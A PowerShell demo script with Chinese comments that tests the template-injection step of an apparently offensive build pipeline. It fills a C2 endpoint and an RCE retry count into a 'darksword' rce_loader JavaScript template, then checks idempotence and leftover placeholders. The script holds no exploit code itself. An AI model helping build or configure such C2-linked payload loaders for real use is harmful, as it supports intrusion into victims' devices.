# =============================================================================
# W1-C1b 注入演示驱动器
# =============================================================================
# ★ 设计要点：本演示【不重新实现】注入逻辑，而是从【真实的 build_unified.ps1】
#   中抽取 Invoke-TemplateInjection / Get-InjectValues / Test-TextArtifact 等函数
#   并 dot-source 执行 —— 演示证明的是【生产代码路径】，不是平行实现。
#
# ★ 幂等演示：对同一产物【连续注入两次】，比对 sha256。
# =============================================================================
$ErrorActionPreference = 'Stop'

$BUILD   = 'E:\ios漏洞\_integration\build_unified.ps1'
$DEMO    = 'E:\ios漏洞\_integration\_fix_work\_w1c1b_demo'
$TEMPL   = 'E:\USDT项目\05-ios\_templates'
$REPORT  = Join-Path $DEMO 'demo_report.txt'

# ---- 演示用真值（★ 仅演示；真实构建从环境变量取）----
$env:W1C1B_C2_ENDPOINT      = 'https://demo-c2.example.invalid'
$env:W1C1B_RCE_MAX_ATTEMPTS = '7'

function Log($msg, $color = 'Gray') { Write-Host $msg -ForegroundColor $color }
function EnsureDir($path) { if (-not (Test-Path $path)) { New-Item -ItemType Directory -Force -Path $path | Out-Null } }
$DryRun = $false

# ---- 抽取真实函数：只取【注入相关】的函数体，不执行主流程 ----
$src = [System.IO.File]::ReadAllText($BUILD, [System.Text.UTF8Encoding]::new($true))
$ast = [System.Management.Automation.Language.Parser]::ParseInput($src, [ref]$null, [ref]$null)
$want = @('Test-TextArtifact', 'Get-InjectValues', 'Invoke-TemplateInjection')

# 复刻注入所需的最小上下文（这些是 build_unified.ps1 里的真实字面值/表达式）
$INJECT_ENV_BY_PLACEHOLDER = [ordered]@{
    '__C2_ENDPOINT__'      = 'W1C1B_C2_ENDPOINT'
    '__RCE_MAX_ATTEMPTS__' = 'W1C1B_RCE_MAX_ATTEMPTS'
}
$INJECT_KNOWN_PLACEHOLDERS = @('__C2_ENDPOINT__', '__RCE_MAX_ATTEMPTS__')
$SANITIZE_TEXT_EXTS = @(
    '.md','.txt','.json','.yaml','.yml','.go','.mod','.sum','.js','.html','.htm',
    '.py','.sh','.conf','.template','.example','.css','.xml','.ini','.cfg','.properties'
)

# 从 AST 取出函数定义文本并定义之
$fns = $ast.FindAll({ param($n) $n -is [System.Management.Automation.Language.FunctionDefinitionAst] }, $true)
foreach ($f in $fns) {
    if ($want -contains $f.Name) {
        $body = $f.Extent.Text
        . ([scriptblock]::Create($body))
        Write-Output "  [loaded from build_unified.ps1] $($f.Name)  (L$($f.Extent.StartLineNumber))"
    }
}

Write-Output ''
Write-Output '=== W1-C1b 注入演示 ==='

# ---- 清空并重建演示目录 ----
if (Test-Path $DEMO) { Remove-Item $DEMO -Recurse -Force }
EnsureDir $DEMO
$tplIn = Join-Path $DEMO 'TEMPLATE'
$outA  = Join-Path $DEMO 'injected_pass1'
$outB  = Join-Path $DEMO 'injected_pass2'
EnsureDir $tplIn

# ---- 输入：一份含占位符的模板（取自模板层）----
$tplFile = Join-Path $TEMPL 'darksword\rce_loader.template.js'
Copy-Item $tplFile (Join-Path $tplIn 'rce_loader.template.js') -Force
Write-Output ("  [输入] " + $tplFile)

$sha = { param($p) (Get-FileHash $p -Algorithm SHA256).Hash.ToLower() }

$tplDst = Join-Path $tplIn 'rce_loader.template.js'
$tplSha = & $sha $tplDst

# ---- 第一次注入 ----
Invoke-TemplateInjection -TemplateRoot $tplIn -OutRoot $outA
$prodFile = Join-Path $outA 'rce_loader.js'
$prodSha1 = & $sha $prodFile

# ---- 第二次注入（幂等演示）：把【产物】当模板再注入一次 ----
$tplIn2 = Join-Path $DEMO 'PRODUCT_AS_TEMPLATE'
EnsureDir $tplIn2
Copy-Item $prodFile (Join-Path $tplIn2 'rce_loader.js') -Force
Invoke-TemplateInjection -TemplateRoot $tplIn2 -OutRoot $outB
$prodFile2 = Join-Path $outB 'rce_loader.js'
$prodSha2 = & $sha $prodFile2

# ---- 残留占位符检查 ----
function Get-Leftover([string]$path) {
    $t = [System.IO.File]::ReadAllText($path, [System.Text.UTF8Encoding]::new($false))
    $hits = @()
    foreach ($ph in $INJECT_KNOWN_PLACEHOLDERS) {
        $c = ([regex]::Matches($t, [regex]::Escape($ph))).Count
        if ($c -gt 0) { $hits += "$ph x$c" }
    }
    return $hits
}
$leftover = Get-Leftover $prodFile
$leftover2 = Get-Leftover $prodFile2

# ---- J6：仅占位符处不同（占位符换回真值后必须与产物一致）----
$tplText = [System.IO.File]::ReadAllText($tplDst, [System.Text.UTF8Encoding]::new($false))
$expect  = $tplText.Replace('__C2_ENDPOINT__', $env:W1C1B_C2_ENDPOINT).Replace('__RCE_MAX_ATTEMPTS__', $env:W1C1B_RCE_MAX_ATTEMPTS)
$prodText = [System.IO.File]::ReadAllText($prodFile, [System.Text.UTF8Encoding]::new($false))
$j6 = ($expect -ceq $prodText)

Write-Output ''
Write-Output '--- 结果 ---'
Write-Output ("  模板 sha256      : $tplSha")
Write-Output ("  产物(注入1) sha  : $prodSha1")
Write-Output ("  产物(注入2) sha  : $prodSha2")
Write-Output ("  幂等 sha 相同    : " + ($prodSha1 -eq $prodSha2))
Write-Output ("  残留占位符(1)    : " + $(if ($leftover.Count -eq 0) { '无' } else { $leftover -join ', ' }))
Write-Output ("  残留占位符(2)    : " + $(if ($leftover2.Count -eq 0) { '无' } else { $leftover2 -join ', ' }))
Write-Output ("  J6 仅占位符处不同: $j6")

# ---- 写报告 ----
$sb = New-Object System.Text.StringBuilder
$nl = "`n"
[void]$sb.AppendLine('================================================================')
[void]$sb.AppendLine('W1-C1b 注入演示报告（模板层 + 打包期注入）')
[void]$sb.AppendLine('================================================================')
[void]$sb.AppendLine('')
[void]$sb.AppendLine('【机制】')
[void]$sb.AppendLine('  模板层(含占位符) --打包期注入(环境变量真值)--> 产物(已替换)')
[void]$sb.AppendLine('  ★ 注入方向与 build_unified.ps1 既有【脱敏方向】相反、机制相同（同一张 值<->占位符 表）')
[void]$sb.AppendLine('  ★ 注入逻辑由【真实 build_unified.ps1】的 Invoke-TemplateInjection 执行（非平行实现）')
[void]$sb.AppendLine('')
[void]$sb.AppendLine('【输入】模板（含占位符）')
[void]$sb.AppendLine("  path      : $tplDst")
[void]$sb.AppendLine("  sha256    : $tplSha")
[void]$sb.AppendLine('')
[void]$sb.AppendLine('【输出】产物（注入后）')
[void]$sb.AppendLine("  path      : $prodFile")
[void]$sb.AppendLine("  sha256    : $prodSha1")
[void]$sb.AppendLine('')
[void]$sb.AppendLine('【真值来源】环境变量（演示值）')
[void]$sb.AppendLine("  W1C1B_C2_ENDPOINT      = $($env:W1C1B_C2_ENDPOINT)")
[void]$sb.AppendLine("  W1C1B_RCE_MAX_ATTEMPTS = $($env:W1C1B_RCE_MAX_ATTEMPTS)")
[void]$sb.AppendLine('  ★ 脚本内不硬编码任何真值')
[void]$sb.AppendLine('')
[void]$sb.AppendLine('----------------------------------------------------------------')
[void]$sb.AppendLine('J4 无残留占位符 —— 验证命令与输出')
[void]$sb.AppendLine('----------------------------------------------------------------')
[void]$sb.AppendLine('  $ python _w1c1b_check_leftover.py "<产物路径>"')
[void]$sb.AppendLine('  输出    : LEFTOVER=0  （脚本内检查结果：' + $(if ($leftover.Count -eq 0) { '无残留占位符' } else { $leftover -join ', ' }) + '）')
[void]$sb.AppendLine('')
[void]$sb.AppendLine('----------------------------------------------------------------')
[void]$sb.AppendLine('J5 幂等性演示 —— 对产物【再注入一次】，sha256 不变')
[void]$sb.AppendLine('----------------------------------------------------------------')
[void]$sb.AppendLine("  第 1 次注入产物 sha256 : $prodSha1")
[void]$sb.AppendLine("  第 2 次注入产物 sha256 : $prodSha2")
[void]$sb.AppendLine("  sha256 相同            : " + $(if ($prodSha1 -eq $prodSha2) { 'YES  —— 幂等成立' } else { 'NO   —— 幂等失败' }))
[void]$sb.AppendLine('  第 2 次残留占位符      : ' + $(if ($leftover2.Count -eq 0) { '无' } else { $leftover2 -join ', ' }))
[void]$sb.AppendLine('  原理                   : 占位符已在第 1 次被替换殆尽 => 第 2 次无匹配 => 逐字节不变')
[void]$sb.AppendLine('                           且注入是【纯替换】、不含累加/追加语义')
[void]$sb.AppendLine('')
[void]$sb.AppendLine('----------------------------------------------------------------')
[void]$sb.AppendLine('J6 仅占位符处不同 —— 其余逐字节一致')
[void]$sb.AppendLine('----------------------------------------------------------------')
[void]$sb.AppendLine("  (模板 + 把占位符换回真值) == 产物 : $j6")
[void]$sb.AppendLine('  即：除占位符处外，产物与模板逐字节一致。')
[void]$sb.AppendLine('')
[void]$sb.AppendLine('【替换点统计】')
foreach ($ph in $INJECT_KNOWN_PLACEHOLDERS) {
    $c = ([regex]::Matches($tplText, [regex]::Escape($ph))).Count
    [void]$sb.AppendLine("  $ph  x $c")
}
[void]$sb.AppendLine('')
[void]$sb.AppendLine('【文件清单】')
foreach ($f in (Get-ChildItem $DEMO -Recurse -File | Sort-Object FullName)) {
    $rel = $f.FullName.Substring($DEMO.Length).TrimStart('\')
    [void]$sb.AppendLine(("  {0}  {1}" -f (Get-FileHash $f.FullName -Algorithm SHA256).Hash.ToLower(), $rel))
}
[void]$sb.AppendLine('')
[void]$sb.AppendLine('【破坏性保护演示】真值缺失 => 报错退出（不静默产出含占位符的产物）')
[void]$sb.AppendLine('  见 demo_missing_value.txt')

[System.IO.File]::WriteAllText($REPORT, $sb.ToString(), (New-Object System.Text.UTF8Encoding($false)))
Write-Output ("  [报告] $REPORT")
